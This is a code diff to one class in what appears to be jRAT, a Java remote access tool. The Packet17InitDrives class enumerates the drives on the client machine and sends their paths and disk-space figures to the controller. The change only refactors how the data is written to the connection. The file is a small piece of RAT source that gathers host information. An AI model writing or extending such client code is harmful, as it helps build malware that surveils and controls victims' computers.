@@ -1,23 +1,23 @@
 package jrat.client.packets.outgoing;
 
-import jrat.common.io.StringWriter;
-import java.io.DataOutputStream;
+import jrat.client.Connection;
+
 import java.io.File;
 
 
 public class Packet17InitDrives extends AbstractOutgoingPacket {
 
 	@Override
-	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
+	public void write(Connection con) throws Exception {
 		File[] drives = File.listRoots();
-		
-		dos.writeInt(drives.length);
+
+        con.writeInt(drives.length);
 		
 		for (File drive : drives) {
-			sw.writeLine(drive.getAbsolutePath());
-			dos.writeShort((int) (drive.getTotalSpace() / 1024L / 1024L / 1024L));
-			dos.writeShort((int) (drive.getFreeSpace() / 1024L / 1024L / 1024L));
-			dos.writeShort((int) (drive.getUsableSpace() / 1024L / 1024L / 1024L));
+            con.writeLine(drive.getAbsolutePath());
+            con.writeShort((short) (drive.getTotalSpace() / 1024L / 1024L / 1024L));
+            con.writeShort((short) (drive.getFreeSpace() / 1024L / 1024L / 1024L));
+            con.writeShort((short) (drive.getUsableSpace() / 1024L / 1024L / 1024L));
 		}
 	}
 
